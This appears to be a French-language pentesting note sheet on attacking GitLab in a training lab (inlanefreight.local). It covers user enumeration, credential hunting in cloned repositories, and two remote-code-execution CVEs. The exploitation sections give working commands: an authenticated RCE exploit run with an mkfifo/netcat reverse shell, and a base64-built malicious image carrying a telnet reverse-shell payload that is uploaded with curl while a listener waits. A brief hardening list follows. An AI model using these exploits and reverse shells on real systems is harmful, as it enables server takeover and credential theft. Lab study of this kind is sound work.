
[[#ENUMERATION MANUELLE]]
[[#EXPLOITATION]]

1. Créer un compte si possible

# ENUMERATION MANUELLE


## Identifier version

Nécessite d'être connecté
http://support.inlanefreight.local:8081/help


## Creds Hunting

/explore -> voir les projets publiques (si non connecté) ou les projets privés (si connecté)

Faire un git clone des projets et chercher des identifiants avec TruffleHog [[9. GIT]]

---

# EXPLOITATION

## User Enum

TESTER DIFFERENTES CASSE

https://www.exploit-db.com/exploits/49821

```shell
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
```

https://github.com/dpgg101/GitLabUserEnum

```bash
python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -v | grep exists
```



## CVEs

### Authenticated RCE (< 13.10.3)

https://www.exploit-db.com/exploits/49951

```shell
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

### Unauthenticated RCE (< 13.10.3, < 13.9.6, < 13.8.8)

https://www.exploit-db.com/exploits/50532

1. Générer payload
```bash
echo -e "QVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHs=" | base64 -d > lol.jpg
echo -n 'TF=$(mktemp -u);mkfifo $TF && telnet 10.0.0.3 1270 0<$TF | sh 1>$TF' >> lol.jpg
echo -n
"fSAuIFwKIiBiICIpICkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg=="
| base64 -d >> lol.jpg
```

2. Lancer listener

```bash
nc -lnvp 1270
```

3. Envoyer le payload

```bash
curl -v -F 'file=@lol.jpg' http://10.0.0.7/$(openssl rand -hex 8)
```


---

# HARDENING

https://about.gitlab.com/blog/2020/05/20/gitlab-instance-security-best-practices/


- Requiring admin approval for new sign-ups
- Configured lists of domains allowed for sign-ups
- Configuring a deny list
